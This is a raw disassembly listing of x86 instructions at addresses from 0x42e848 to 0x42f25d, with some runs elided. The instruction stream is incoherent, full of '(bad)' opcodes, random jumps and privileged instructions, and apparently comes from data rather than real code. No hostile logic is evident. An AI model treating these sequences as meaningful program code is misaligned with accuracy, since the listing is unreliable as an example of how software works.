  42e848:	mov    al,ds:0xdb69690a
  42e84d:	retf   
  42e84e:	daa    
  42e84f:	mov    bh,dh
  42e851:	jno    0x42e86e
  42e853:	rcl    DWORD PTR [ecx-0x16abe7bb],cl
  42e859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e85a:	jle    0x42e887
  42e85c:	lods   al,BYTE PTR ds:[esi]
  42e85d:	rcr    BYTE PTR [ebx-0x3e76782a],1
  42e863:	shl    cl,1
  42e865:	mov    ah,0x6
  42e867:	int    0xab
  42e869:	enter  0x4ca0,0xc2
  42e86d:	mov    ah,0x71
  42e86f:	pop    eax
  42e870:	repnz push ss
  42e872:	loopne 0x42e8c5
  42e874:	add    dl,BYTE PTR [ebp-0x29]
  42e877:	and    DWORD PTR [edx],ecx
  42e879:	nop
  42e87a:	ja     0x42e7fd
  42e87c:	jle    0x42e8f8
  42e87e:	hlt    
  42e87f:	(bad)  [edi+0x72]
  42e882:	lds    ecx,FWORD PTR [ecx]
  42e884:	adc    DWORD PTR ss:[ebp-0x248fd604],ebx
  42e88b:	sbb    eax,DWORD PTR [ecx-0x50]
  42e88e:	xchg   bh,ah
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x4f23f82b]
  42e901:	push   edi
  42e902:	shr    DWORD PTR [esp+ecx*2],1
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	xor    bl,bl
  42e90e:	push   esp
  42e90f:	imul   ebx,DWORD PTR [ebx],0x50
  42e912:	adc    eax,0x4d82230c
  42e917:	iret   
  42e918:	jecxz  0x42e95c
  42e91a:	(bad)  
  42e91b:	(bad)  
  42e91c:	in     eax,0xb1
  42e91e:	jns    0x42e940
  42e920:	js     0x42e91c
  42e922:	inc    ebx
  42e923:	dec    edi
  42e924:	test   eax,0x8a1110b3
  42e929:	mov    eax,0x224c42db
  42e92e:	or     BYTE PTR [ebp+0x49c1454c],al
  42e934:	scas   eax,DWORD PTR es:[edi]
  42e935:	push   ds
  42e936:	adc    dh,dh
  42e938:	pusha  
  42e939:	jo     0x42e906
  42e93b:	(bad)  
  42e93c:	cwde   
  42e93d:	sar    DWORD PTR [edi],0x99
  42e940:	les    esp,FWORD PTR [ecx+0x7]
  42e943:	fcomp  QWORD PTR [ecx-0x1b]
  42e946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e947:	dec    edi
  42e948:	gs jb  0x42e9c3
  42e94b:	sbb    eax,0x15d27a8f
  42e950:	dec    ebx
  42e951:	push   ebp
  42e952:	(bad)  [edi+0x3]
  42e955:	hlt    
  42e956:	aas    
  42e957:	mov    dl,0x8f
  42e959:	dec    edi
  42e95a:	xchg   ecx,eax
  42e95b:	inc    eax
  42e95c:	pushf  
  42e95d:	xchg   esp,eax
  42e95e:	cs int 0x11
  42e961:	jbe    0x42e9ae
  42e963:	pushf  
  42e964:	xchg   edx,eax
  42e965:	test   DWORD PTR [esi-0x76],ecx
  42e968:	(bad)  
  42e969:	imul   esi,DWORD PTR [ecx],0x44170f48
  42e96f:	(bad)  
  42e970:	stc    
  42e971:	inc    ebx
  42e972:	dec    ebp
  42e973:	stc    
  42e974:	push   ebx
  42e975:	dec    esi
  42e976:	pop    esi
  42e977:	push   edx
  42e978:	lock cmp al,0xa5
  42e97b:	sub    DWORD PTR [ebx-0x3e52cb9d],ecx
  42e981:	lods   al,BYTE PTR ds:[esi]
  42e982:	add    eax,0x3f013e7c
  42e987:	aam    0xe6
  42e989:	push   0x81c81f77
  42e98e:	ret    0xabc8
  42e991:	xchg   edx,eax
  42e992:	clc    
  42e993:	jnp    0x42e956
  42e995:	dec    edx
  42e996:	push   es
  42e997:	mov    ds:0xaf812324,al
  42e99c:	jmp    0x3ec7:0x9cf480cd
  42e9a3:	shl    BYTE PTR [ebp+0x52],1
  42e9a6:	jbe    0x42e9bc
  42e9a8:	sbb    eax,0xa6a5a0de
  42e9ad:	push   ecx
  42e9ae:	and    al,0x5e
  42e9b0:	lea    esp,[edi-0x19]
  42e9b3:	popf   
  42e9b4:	test   BYTE PTR [edi],ch
  42e9b6:	das    
  42e9b7:	not    BYTE PTR [edi]
  42e9b9:	push   0x73
  42e9bb:	mov    BYTE PTR [ebx-0x2973d6bb],dh
  42e9c1:	pop    ecx
  42e9c2:	stos   BYTE PTR es:[edi],al
  42e9c3:	inc    ebp
  42e9c4:	jae    0x42e9f3
  42e9c6:	xchg   esp,eax
  42e9c7:	xchg   esi,eax
  42e9c8:	aaa    
  42e9c9:	jmp    0x4bdf2f74
  42e9ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9cf:	sub    al,0x4d
  42e9d1:	out    dx,al
  42e9d2:	inc    edi
  42e9d3:	je     0x42e9f2
  42e9d5:	fist   WORD PTR [edx-0x5db7fa43]
  42e9db:	nop
  42e9dc:	mov    cl,0x57
  42e9de:	and    esp,DWORD PTR [ebx+0x3a8cc231]
  42e9e4:	pop    ecx
  42e9e5:	sbb    BYTE PTR [eax-0x56],ch
  42e9e8:	dec    edi
  42e9e9:	pusha  
  42e9ea:	stos   DWORD PTR es:[edi],eax
  42e9eb:	sti    
  42e9ec:	les    esi,FWORD PTR [ebx-0x7b75083]
  42e9f2:	enter  0xce35,0x13
  42e9f6:	pusha  
  42e9f7:	pusha  
  42e9f8:	int3   
  42e9f9:	dec    edx
  42e9fa:	pop    ebx
  42e9fb:	sub    ebp,DWORD PTR [edx]
  42e9fd:	retf   
  42e9fe:	xchg   ebp,eax
  42e9ff:	fwait
  42ea00:	sar    DWORD PTR [edx],cl
  42ea02:	das    
  42ea03:	or     eax,DWORD PTR [esi]
  42ea05:	loope  0x42e9a0
  42ea07:	xor    edi,DWORD PTR cs:[edx+0x7e8375b9]
  42ea0e:	or     eax,0x42
	...
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	mov    esp,0x50a9da93
  42ea85:	repz add DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	(bad)  
  42ea8d:	and    ch,ah
  42ea8f:	bound  ecx,QWORD PTR [esi-0x21b58a55]
  42ea95:	push   esp
  42ea96:	int3   
  42ea97:	out    dx,al
  42ea98:	xor    ebx,DWORD PTR [edi+0x29ffeb5b]
  42ea9e:	sub    DWORD PTR [ebx-0x7e5dc8ba],ebx
  42eaa4:	xchg   ecx,eax
  42eaa5:	adc    eax,0xd8d8a817
  42eaaa:	add    eax,0xffffff9b
  42eaad:	fsub   QWORD PTR [ecx]
  42eaaf:	jle    0x42eb04
  42eab1:	add    dh,ch
  42eab3:	sti    
  42eab4:	or     edx,ecx
  42eab6:	push   ebx
  42eab7:	jmp    0x42ea49
  42eab9:	enter  0x5e40,0x18
  42eabd:	mov    edi,0x534003a1
  42eac2:	dec    esi
  42eac3:	add    al,0x12
  42eac5:	add    al,0x6e
  42eac7:	pop    es
  42eac8:	pop    esp
  42eac9:	push   0x1ff5fe22
  42eace:	jns    0x42eac8
  42ead0:	push   ds
  42ead1:	adc    BYTE PTR [ecx-0xb3da3a0],al
  42ead7:	xor    al,0x89
  42ead9:	jnp    0x42ea61
  42eadb:	ss addr16 push ds
  42eade:	and    DWORD PTR [eax],ebp
  42eae0:	mov    eax,0xe9438fb
  42eae5:	adc    al,0x86
  42eae7:	outs   dx,DWORD PTR ds:[esi]
  42eae8:	sub    esi,ebx
  42eaea:	cwde   
  42eaeb:	jbe    0x42ea6f
  42eaed:	sbb    eax,0x89a5674e
  42eaf2:	sahf   
  42eaf3:	fstp   DWORD PTR [edi+eiz*4]
  42eaf6:	pop    ds
  42eaf7:	fldenv [ebx]
  42eaf9:	ret    0xa3dc
  42eafc:	dec    ecx
  42eafd:	add    esi,DWORD PTR [ecx+edi*2-0x56]
  42eb01:	push   ss
  42eb02:	xor    esi,DWORD PTR [esi+0x451cd11a]
  42eb08:	mov    bh,0xdd
  42eb0a:	imul   ebp,esp,0x3ee308a3
  42eb10:	and    esp,ecx
  42eb12:	scas   al,BYTE PTR es:[edi]
  42eb13:	(bad)  
  42eb15:	nop
  42eb16:	test   BYTE PTR [eax],dh
  42eb18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb19:	dec    ebp
  42eb1a:	fmul   QWORD PTR [eax+0x23]
  42eb1d:	jb     0x42eb13
  42eb1f:	mov    ebp,0x36140878
  42eb24:	int    0x38
  42eb26:	inc    esi
  42eb27:	jnp    0x42eadd
  42eb29:	inc    eax
  42eb2a:	iret   
  42eb2b:	shr    BYTE PTR [eax-0x4db51e4e],0x27
  42eb32:	aas    
  42eb33:	add    dl,BYTE PTR gs:[ebp+0x33e2fb49]
  42eb3a:	dec    ecx
  42eb3b:	out    dx,eax
  42eb3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb3d:	mov    ah,BYTE PTR gs:0x22120436
  42eb44:	outs   dx,DWORD PTR ds:[esi]
  42eb45:	lock xor al,0x1d
  42eb48:	imul   eax,DWORD PTR [esi],0x46
  42eb4b:	imul   edx,DWORD PTR [esi+0x7b],0xc59d4f77
  42eb52:	pusha  
  42eb53:	scas   al,BYTE PTR es:[edi]
  42eb54:	aas    
  42eb55:	dec    esi
  42eb56:	pop    ebp
  42eb57:	inc    eax
  42eb58:	push   edi
  42eb59:	inc    ebp
  42eb5a:	mov    ds:0x7bc5d778,eax
  42eb5f:	int    0x4d
  42eb61:	clc    
  42eb62:	fild   WORD PTR [eax-0x481de716]
  42eb68:	mov    cl,0xaf
  42eb6a:	mov    edx,0x6aab4fc2
  42eb6f:	push   eax
  42eb70:	pop    edx
  42eb71:	mov    edi,0x8997a4c
  42eb76:	(bad)  
  42eb77:	jnp    0x42eb0e
  42eb79:	lahf   
  42eb7a:	or     ecx,0x1d296498
  42eb80:	out    0x5f,eax
  42eb82:	adc    BYTE PTR [edi],ah
  42eb84:	sub    BYTE PTR [edx],dl
  42eb86:	pop    es
  42eb87:	mov    esi,0x95fa9243
  42eb8c:	in     eax,dx
  42eb8d:	frstpm(287 only) 
  42eb8f:	fild   DWORD PTR [eax]
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	cmp    DWORD PTR [edi],0x54bb36d1
  42ec05:	hlt    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	iret   
  42ec0d:	jae    0x42ebde
  42ec0f:	dec    esi
  42ec10:	pop    ebx
  42ec11:	add    eax,DWORD PTR [ecx+eiz*4-0x520676c7]
  42ec18:	and    DWORD PTR [ebp-0x2e],ebx
  42ec1b:	mov    WORD PTR [esi+ebx*1+0x5ab63ef0],es
  42ec22:	xor    DWORD PTR [ecx+ebx*8],eax
  42ec25:	push   0xd9727462
  42ec2a:	and    dl,BYTE PTR [esi-0x37]
  42ec2d:	jmp    0x4d00e457
  42ec32:	dec    esi
  42ec33:	pop    edi
  42ec34:	adc    cl,bl
  42ec36:	pop    eax
  42ec37:	and    bl,bh
  42ec39:	js     0x42ec12
  42ec3b:	imul   esi,DWORD PTR [ebx-0x7f89bcf4],0x66
  42ec42:	inc    ecx
  42ec43:	mov    al,ds:0x179c4b2d
  42ec48:	mov    esi,0x5893c725
  42ec4d:	and    eax,0x64d716a1
  42ec52:	retf   0xe6ac
  42ec55:	push   ebp
  42ec56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec57:	imul   edx,DWORD PTR ds:[ecx+ebp*1+0x117810b6],0xfa0eadf5
  42ec63:	and    BYTE PTR [ecx+0x46a4383d],dh
  42ec69:	lea    ecx,[ebx]
  42ec6b:	add    al,0xa1
  42ec6d:	jbe    0x42ec2e
  42ec6f:	in     eax,0xf0
  42ec71:	(bad)  
  42ec72:	push   eax
  42ec73:	inc    eax
  42ec74:	loopne 0x42ec93
  42ec76:	inc    esp
  42ec77:	loop   0x42ec4c
  42ec79:	jle    0x42eca3
  42ec7b:	push   edi
  42ec7c:	aad    0x6
  42ec7e:	sub    bh,BYTE PTR [ebx-0x60c3a93b]
  42ec84:	neg    BYTE PTR [ecx+ebx*1]
  42ec87:	push   edx
  42ec88:	mov    eax,ds:0xefa8cd0
  42ec8d:	xchg   ebp,eax
  42ec8e:	mov    edx,0xc26a6917
  42ec93:	mov    ecx,0xdd4a5ba2
  42ec98:	out    0x14,al
  42ec9a:	jne    0x42ec38
  42ec9c:	arpl   si,dx
  42ec9e:	sbb    DWORD PTR [ecx],ebx
  42eca0:	pushf  
  42eca1:	mov    ch,0x1f
  42eca3:	mov    edi,0x1218043c
  42eca8:	sub    eax,0xa4202e23
  42ecad:	pop    ss
  42ecae:	xchg   ecx,eax
  42ecaf:	xor    eax,0x3384bf20
  42ecb4:	leave  
  42ecb5:	push   0xffffffd0
  42ecb7:	mov    ecx,0x2df3e725
  42ecbc:	repnz sbb ebx,DWORD PTR [ecx-0x79]
  42ecc0:	out    dx,eax
  42ecc1:	sbb    BYTE PTR [edi+0x4767ed21],0xc7
  42ecc8:	push   ss
  42ecc9:	fcomp  DWORD PTR ds:0x97566adb
  42eccf:	xor    eax,0x31947023
  42ecd4:	push   edx
  42ecd5:	das    
  42ecd6:	div    BYTE PTR [ebx-0x79]
  42ecd9:	dec    esi
  42ecda:	test   al,0x36
  42ecdc:	jb     0x42ecbe
  42ecde:	arpl   WORD PTR [edx],sp
  42ece0:	sbb    ah,cl
  42ece2:	lock sbb eax,0xfc091fea
  42ece8:	daa    
  42ece9:	dec    esp
  42ecea:	push   0x2a
  42ecec:	xchg   ecx,eax
  42eced:	aam    0x18
  42ecef:	inc    ecx
  42ecf0:	dec    edi
  42ecf1:	jg     0x42ec7f
  42ecf3:	fwait
  42ecf4:	sahf   
  42ecf5:	mov    ds:0x5d06b414,al
  42ecfa:	sub    DWORD PTR [ebx+0xa],edx
  42ecfd:	(bad)  
  42ecfe:	out    0xb1,eax
  42ed00:	jb     0x42ecb0
  42ed02:	dec    ebp
  42ed03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ed04:	cdq    
  42ed05:	push   cs
  42ed06:	pushf  
  42ed07:	pop    esi
  42ed08:	(bad)  
  42ed09:	adc    DWORD PTR [edx],0xb974403f
  42ed0f:	jae    0x42ed11
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp+0x2ba198a2]
  42ed83:	sub    ebx,DWORD PTR [eax-0xb]
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	repnz out 0x79,al
  42ed8f:	inc    DWORD PTR [edi+0x4ca94773]
  42ed95:	jo     0x42eda5
  42ed97:	pop    eax
  42ed98:	add    dh,BYTE PTR [eax+0x521a3c60]
  42ed9e:	into   
  42ed9f:	in     eax,dx
  42eda0:	mov    ds:0x2f4d16b4,eax
  42eda5:	jne    0x42ed2c
  42eda7:	xlat   BYTE PTR ds:[ebx]
  42eda8:	mov    edi,0xd5abdb4b
  42edad:	or     eax,0x733e4dfa
  42edb2:	add    eax,0xb6b444e2
  42edb7:	leave  
  42edb8:	jl     0x42ee08
  42edba:	out    0xee,al
  42edbc:	pop    ecx
  42edbd:	sub    ch,BYTE PTR [edx+0x7d]
  42edc0:	cmp    al,0x1
  42edc2:	imul   eax,DWORD PTR [eax],0x45
  42edc5:	aaa    
  42edc6:	test   al,0x7
  42edc8:	push   cs
  42edc9:	sti    
  42edca:	(bad)  
  42edcb:	int    0x33
  42edcd:	push   esp
  42edce:	dec    ebx
  42edcf:	outs   dx,DWORD PTR ds:[esi]
  42edd0:	xor    esi,DWORD PTR [ebp-0x43f5d241]
  42edd6:	sub    edx,esi
  42edd8:	sbb    DWORD PTR [esp+eax*4+0x5f],eax
  42eddc:	in     eax,dx
  42eddd:	mov    edx,0xd4ad0f74
  42ede2:	push   cs
  42ede3:	(bad)  
  42ede4:	retf   0x6979
  42ede7:	sub    bl,BYTE PTR [edi+0x2ea97f27]
  42eded:	push   ebp
  42edee:	aad    0x64
  42edf0:	pop    ds
  42edf1:	or     bl,BYTE PTR [ecx+ecx*2+0x4f68791d]
  42edf8:	pop    ebp
  42edf9:	mov    dl,0x79
  42edfb:	xor    bl,BYTE PTR [ebx+0xe]
  42edfe:	scas   al,BYTE PTR es:[edi]
  42edff:	sahf   
  42ee00:	mov    ds:0x92742a2e,al
  42ee05:	call   0xbc49d
  42ee0a:	in     eax,0x2c
  42ee0c:	es fs push ss
  42ee0f:	sbb    eax,0x854f010d
  42ee14:	or     BYTE PTR [eax+0x5d],0x16
  42ee18:	adc    eax,0xfd2c9281
  42ee1d:	xchg   edi,eax
  42ee1e:	fdivr  DWORD PTR [edi-0x61]
  42ee21:	jo     0x42ee09
  42ee23:	mov    ch,BYTE PTR [ebp+0x590c5464]
  42ee29:	add    DWORD PTR [eax-0x2a],esp
  42ee2c:	imul   eax,DWORD PTR [ebx+0x72],0x3ae1ace2
  42ee33:	adc    al,0x5a
  42ee35:	pop    edi
  42ee36:	dec    esp
  42ee37:	hlt    
  42ee38:	data16 (bad) 
  42ee3a:	loop   0x42ee32
  42ee3c:	push   esi
  42ee3d:	mov    bh,0x92
  42ee3f:	inc    ebp
  42ee40:	scas   eax,DWORD PTR es:[edi]
  42ee41:	xchg   ecx,eax
  42ee42:	push   es
  42ee43:	mov    ds:0xa4513853,al
  42ee48:	iret   
  42ee49:	add    bl,BYTE PTR ds:0xbc397845
  42ee4f:	cmp    bh,BYTE PTR [esi]
  42ee51:	lahf   
  42ee52:	jle    0x42ee00
  42ee54:	daa    
  42ee55:	mov    ebx,DWORD PTR [ebx+0x50519db5]
  42ee5b:	std    
  42ee5c:	push   0x8
  42ee5e:	les    esi,FWORD PTR [ebp+edx*2+0xadc6dc0]
  42ee65:	xchg   edx,eax
  42ee66:	or     ecx,0xffffffaf
  42ee69:	fs mov al,ah
  42ee6c:	sbb    DWORD PTR [edi],edi
  42ee6e:	jg     0x42eea1
  42ee70:	sub    al,0x8c
  42ee72:	jge    0x42ee26
  42ee74:	adc    esi,DWORD PTR [ebx]
  42ee76:	scas   eax,DWORD PTR es:[edi]
  42ee77:	jp     0x42eea3
  42ee79:	adc    al,0x6e
  42ee7b:	shl    DWORD PTR [esi-0x4],0x7f
  42ee7f:	repnz mov gs:0xdb1d8c1c,eax
  42ee86:	xchg   edi,eax
  42ee87:	or     ah,dh
  42ee89:	test   eax,0xf4ea3155
  42ee8e:	lods   al,BYTE PTR ds:[esi]
  42ee8f:	mov    BYTE PTR [eax],0x0
	...
  42eef2:	add    BYTE PTR [eax],al
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	add    dh,BYTE PTR [ebx]
  42ef02:	mov    ah,0xe6
  42ef04:	pop    esp
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	mov    DWORD PTR cs:[ebx],edi
  42ef0f:	test   DWORD PTR [eax-0x5d69e119],0xa8002abb
  42ef19:	mov    ds:0xadf3faa6,al
  42ef1e:	xor    DWORD PTR [eax-0x57],edi
  42ef21:	adc    dh,0x8
  42ef24:	out    0x61,al
  42ef26:	lods   eax,DWORD PTR ds:[esi]
  42ef27:	das    
  42ef28:	loope  0x42ef47
  42ef2a:	test   DWORD PTR [esi-0x41acc917],0x7b8ee573
  42ef34:	add    al,0xc1
  42ef36:	inc    ecx
  42ef37:	fistp  DWORD PTR [edx-0x115ce76b]
  42ef3d:	xchg   edi,eax
  42ef3e:	jns    0x42ef7b
  42ef40:	mov    al,ds:0xf42ec3df
  42ef45:	sti    
  42ef46:	jmp    0x42ef62
  42ef48:	mov    edi,0xb9fe5dab
  42ef4d:	loope  0x42efa3
  42ef4f:	loop   0x42ef88
  42ef51:	arpl   WORD PTR [ecx],bx
  42ef53:	pop    edi
  42ef54:	iret   
  42ef55:	sbb    ch,bl
  42ef57:	int    0x10
  42ef59:	into   
  42ef5a:	ins    DWORD PTR es:[edi],dx
  42ef5b:	out    0xcd,eax
  42ef5d:	imul   eax,DWORD PTR [edi+0x7bb0ed10],0xb09f94c2
  42ef67:	ret    
  42ef68:	stos   DWORD PTR es:[edi],eax
  42ef69:	and    DWORD PTR [eax-0x18ce19ce],ebp
  42ef6f:	pop    esp
  42ef70:	push   ebx
  42ef71:	add    esp,ebp
  42ef73:	stc    
  42ef74:	xor    al,0xf6
  42ef76:	retf   
  42ef77:	jle    0x42ef42
  42ef79:	pop    es
  42ef7a:	ret    0x97a9
  42ef7d:	inc    ecx
  42ef7e:	test   eax,0x8e3f4ff3
  42ef83:	(bad)  
  42ef85:	pop    esp
  42ef86:	lds    edx,FWORD PTR [ebp+0x50]
  42ef89:	aaa    
  42ef8a:	sub    eax,0x3f371853
  42ef8f:	jecxz  0x42efb0
  42ef91:	and    BYTE PTR [eax-0x2597f206],bh
  42ef97:	mov    ch,0x6c
  42ef99:	jmp    0x42efbc
  42ef9b:	sbb    DWORD PTR [eax+0x41],ecx
  42ef9e:	fist   DWORD PTR [eax+esi*1]
  42efa1:	push   cs
  42efa2:	pusha  
  42efa3:	call   0x4b2752f4
  42efa8:	jbe    0x42f007
  42efaa:	stos   DWORD PTR es:[edi],eax
  42efab:	dec    ebx
  42efac:	mov    ah,0x19
  42efae:	retf   0x35f
  42efb1:	sub    BYTE PTR [esi-0x5c],0x7
  42efb5:	imul   edx,DWORD PTR [esi-0x2675ab05],0x3f69290d
  42efbf:	xor    eax,0x378e1d85
  42efc4:	pop    eax
  42efc5:	pop    edx
  42efc6:	mov    bl,0x36
  42efc8:	test   BYTE PTR [ebx],al
  42efca:	and    BYTE PTR [ebp+0x5c],al
  42efcd:	(bad)  
  42efce:	arpl   cx,cx
  42efd0:	sub    eax,0x97eaef9f
  42efd5:	adc    eax,0x27fa91fa
  42efda:	or     bl,al
  42efdc:	js     0x42efa1
  42efde:	pop    ecx
  42efdf:	mov    al,ds:0x6d77508
  42efe4:	daa    
  42efe5:	mov    eax,0x2aebf297
  42efea:	sbb    dh,BYTE PTR [ecx+ebx*1-0x45]
  42efee:	dec    edx
  42efef:	dec    eax
  42eff0:	js     0x42f065
  42eff2:	in     eax,dx
  42eff3:	sti    
  42eff4:	jb     0x42efd3
  42eff6:	pop    edi
  42eff7:	ret    
  42eff8:	scas   eax,DWORD PTR es:[edi]
  42eff9:	int    0xbe
  42effb:	test   ch,ah
  42effd:	fdiv   st,st(3)
  42efff:	sub    ebx,esp
  42f001:	pop    edi
  42f002:	sahf   
  42f003:	sahf   
  42f004:	dec    ebx
  42f005:	inc    ebx
  42f006:	jbe    0x42f04c
  42f008:	mov    esi,0x27aa94b9
  42f00d:	sub    edx,DWORD PTR [esi]
  42f00f:	add    DWORD PTR [eax],0x0
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	ror    BYTE PTR [ecx-0x89f4abd],cl
  42f086:	add    DWORD PTR [eax],eax
  42f088:	add    al,0x1
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	stos   BYTE PTR es:[edi],al
  42f08d:	aad    0x3b
  42f08f:	xchg   BYTE PTR [ebp+0x63eb4e64],ch
  42f095:	fwait
  42f096:	les    esi,FWORD PTR [ebx+ebp*1-0x49d699d5]
  42f09d:	cmp    edi,DWORD PTR [esi]
  42f09f:	in     al,dx
  42f0a0:	xchg   ebx,eax
  42f0a1:	mov    ah,0x57
  42f0a3:	xchg   DWORD PTR ds:0x6e9b5888,esi
  42f0a9:	stos   BYTE PTR es:[edi],al
  42f0aa:	adc    al,0x59
  42f0ac:	and    eax,0xd6f4eb43
  42f0b1:	pop    es
  42f0b2:	das    
  42f0b3:	hlt    
  42f0b4:	sbb    al,0x98
  42f0b6:	xchg   ebp,eax
  42f0b7:	cli    
  42f0b8:	and    DWORD PTR [ebx+0x31e8059e],ecx
  42f0be:	jl     0x42f0bf
  42f0c0:	loop   0x42f0c2
  42f0c2:	jnp    0x42f106
  42f0c4:	into   
  42f0c5:	scas   eax,DWORD PTR es:[edi]
  42f0c6:	int    0xf8
  42f0c8:	sar    DWORD PTR ds:0x560ba5ea,1
  42f0ce:	in     al,0xc9
  42f0d0:	pop    ecx
  42f0d1:	pop    ds
  42f0d2:	cmp    edx,ebp
  42f0d4:	or     eax,0x61139a0e
  42f0d9:	(bad)  
  42f0da:	push   ss
  42f0db:	in     al,0xe0
  42f0dd:	pop    es
  42f0de:	rcr    DWORD PTR [edi+0x243a9724],0xfb
  42f0e5:	mov    ah,0x32
  42f0e7:	test   DWORD PTR [ecx],eax
  42f0e9:	jp     0x42f0bf
  42f0eb:	data16 loope 0x42f070
  42f0ee:	sbb    BYTE PTR [esi],bl
  42f0f0:	ins    DWORD PTR es:[edi],dx
  42f0f1:	mov    esp,0x3eac73a4
  42f0f6:	test   DWORD PTR [eax+0x3],edx
  42f0f9:	repnz mov al,ds:0x14ce1284
  42f0ff:	ds sbb bh,ch
  42f102:	push   ecx
  42f103:	add    DWORD PTR [edi],0xe5a25b16
  42f109:	into   
  42f10a:	dec    ebx
  42f10b:	mov    esp,0x94c8520b
  42f110:	ja     0x42f0a2
  42f112:	adc    edi,DWORD PTR [edi-0x1a855c1]
  42f118:	mov    al,0xef
  42f11a:	aas    
  42f11b:	jp     0x42f106
  42f11d:	mov    eax,ds:0x72f349ca
  42f122:	pop    ss
  42f123:	inc    ebx
  42f124:	cmp    ah,BYTE PTR [ebp-0x733b6cf2]
  42f12a:	les    ebx,FWORD PTR [esp+ecx*1]
  42f12d:	sar    BYTE PTR [eax],0x1c
  42f130:	xchg   edi,eax
  42f131:	test   eax,0xe6c9201c
  42f137:	sbb    cl,ah
  42f139:	in     al,dx
  42f13a:	popf   
  42f13b:	push   ebx
  42f13c:	jb     0x42f105
  42f13e:	retf   0x21ba
  42f141:	mov    al,ds:0x4f8b00ab
  42f146:	iret   
  42f147:	cmc    
  42f148:	retf   
  42f149:	or     esi,DWORD PTR [esi]
  42f14b:	pop    edx
  42f14c:	std    
  42f14d:	push   ebp
  42f14e:	sbb    ecx,DWORD PTR [esi-0x3a]
  42f151:	fbstp  TBYTE PTR [ebp+0x4]
  42f154:	mov    esi,0x76d77441
  42f159:	les    edx,FWORD PTR [ecx+0x4b]
  42f15c:	jae    0x42f1c4
  42f15e:	outs   dx,BYTE PTR ds:[esi]
  42f15f:	pop    ebx
  42f160:	sbb    al,0xef
  42f162:	shr    ah,0x16
  42f165:	xor    al,0x97
  42f167:	loopne 0x42f0f0
  42f169:	ins    DWORD PTR es:[di],dx
  42f16b:	ret    0xe94b
  42f16e:	pop    esp
  42f16f:	fidiv  DWORD PTR [edx-0x17]
  42f172:	sti    
  42f173:	mov    DWORD PTR [esi-0x22ddc650],ebx
  42f179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f17a:	inc    ecx
  42f17b:	dec    esp
  42f17c:	mov    al,BYTE PTR [ebx]
  42f17e:	xor    DWORD PTR [ebp-0x51],ecx
  42f181:	pop    es
  42f182:	mul    BYTE PTR [esi-0x6cb4451d]
  42f188:	adc    DWORD PTR [ebx],eax
  42f18a:	arpl   WORD PTR [esi-0x2b],cx
  42f18d:	xchg   ebx,eax
  42f18e:	and    BYTE PTR [eax+0x0],al
	...
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	xchg   ebx,eax
  42f201:	out    0x19,al
  42f203:	(bad)  
  42f204:	fs clc 
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	and    bh,dh
  42f20e:	jge    0x42f242
  42f210:	fstp   QWORD PTR ds:0x3acc9e
  42f216:	xor    DWORD PTR [edi],eax
  42f218:	ror    DWORD PTR [ecx],cl
  42f21a:	jl     0x42f25a
  42f21c:	pop    ebx
  42f21d:	mov    esp,0x67c038bb
  42f222:	dec    edi
  42f223:	or     BYTE PTR [ebx],ch
  42f225:	mov    WORD PTR [eax+0x3edfcdae],?
  42f22b:	(bad)  
  42f22c:	adc    al,0x9
  42f22e:	xchg   ecx,eax
  42f22f:	fs mov cl,0x97
  42f232:	mov    edi,DWORD PTR [esi+0x78]
  42f235:	in     eax,0x93
  42f237:	mov    ?,WORD PTR [edi-0x29]
  42f23a:	imul   ebp,DWORD PTR [ebp+0x22b6ef2f],0xf0a350e8
  42f244:	mov    bh,0x98
  42f246:	mov    al,ds:0x9b419e7e
  42f24b:	rcl    BYTE PTR ds:0x591ba78d,cl
  42f251:	and    dx,dx
  42f254:	adc    eax,0xc2a2ba30
  42f259:	test   al,bh
  42f25b:	in     al,0x88
  42f25d:	aas    
